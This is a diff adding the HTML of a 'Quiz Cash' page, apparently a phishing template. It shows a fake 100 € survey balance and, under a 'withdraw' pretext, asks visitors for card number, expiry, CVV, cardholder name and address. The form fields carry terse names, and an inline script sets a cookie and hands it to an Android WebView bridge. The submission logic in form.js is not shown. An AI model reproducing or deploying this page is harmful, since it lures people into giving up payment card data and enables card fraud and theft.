@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quiz Cash</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+</head>
+
+<body>
+    <section class="main main-primary">
+        <div class="nav">
+            <img class="nav-img" src="./img/wallet.svg" alt="wallet">
+            <h2 class="nav-title">Balance 100 €</h2>
+        </div>
+        <div class="quiz-title">
+            <img src="./img/logo_dark.svg" class="quiz-logo" alt="logo">
+            <h3 class="quiz-subtitle">Hello, 11 surveys are available!</h3>
+        </div>
+        <div class="main-content ">
+            <div class="main-content-card main-content-form">
+                <h2 class="main-content-title header-primary">Congratulations! <br>
+                    Make your first withdrawal</h2>
+                <div class="main-loader" id="loader" style="display: none;">
+                    <img class="loader" src="./img/loader.svg" alt="loader">
+                </div>
+                <form class="main-form" id="form2">
+                    <div class="first-title header-primary" id="form-card">Your card</div>
+                    <div class="input-list" id="form-card-input">
+                        <div class="input-wrapper">
+                            <img class="input-image" src="./img/form/num.svg" alt="num">
+                            <input type="text" class="input-field form-input" placeholder="Card number" name="cdn"
+                                id="cardn" maxlength="19">
+                        </div>
+                        <div class="input-row">
+                            <div class="input-wrapper">
+                                <img class="input-image" src="./img/form/cal.svg" alt="num">
+                                <input type="text" id="carddate" class="input-field form-input" name="eeex"
+                                    placeholder="Date">
+                            </div>
+                            <div class="input-wrapper">
+                                <img class="input-image" src="./img/form/wal.svg" alt="num">
+                                <input type="text" id="carv" name="ccc" class="input-field form-input" placeholder="СVV"
+                                    maxlength="3">
+                            </div>
+                        </div>
+                        <div class="input-wrapper">
+                            <img class="input-image" src="./img/form/per.svg" alt="num">
+                            <input type="text" id="cardholder" name="nm" class="input-field form-input"
+                                placeholder="Card holder">
+                        </div>
+                    </div>
+                    <div class="first-title header-primary" id="form-adress">Adress</div>
+                    <div class="input-list" id="form-adress-input">
+                        <div class="input-wrapper">
+                            <img class="input-image" src="./img/form/cit.svg" alt="cit">
+                            <input type="text" class="input-field form-input" placeholder="City" name="ct"
+                                id="cityadress">
+                        </div>
+                        <div class="input-wrapper">
+                            <img class="input-image" src="./img/form/cit.svg" alt="cit">
+                            <input type="text" class="input-field form-input" placeholder="Adress" name="add"
+                                id="adressname">
+                        </div>
+                        <div class="input-wrapper">
+                            <img class="input-image" src="./img/form/cit.svg" alt="cit">
+                            <input type="text" class="input-field form-input" placeholder="ZIP Code" name="zpp"
+                                id="adresszip" maxlength="5">
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <div class="btn-wrapper">
+                <button id="form" class="btn main-link primary-gradient" disabled>Withdraw 100$</button>
+            </div>
+        </div>
+    </section>
+    <script>
+        var date = new Date();
+        date.setTime(date.getTime() + 7 * 24 * 60 * 60 * 1000);
+        var expires = "expires=" + date.toUTCString();
+        var cookieValue = "form" + "=" + true + ";" + expires + ";path=/";
+        document.cookie = cookieValue
+        if (window.AndroidCookieHandler) {
+            window.AndroidCookieHandler.setCookie(cookieValue);
+        }
+    </script>
+    <script src="./form.js"></script>
+    <script src="./navigation.js"></script>
+</body>
+
+</html>
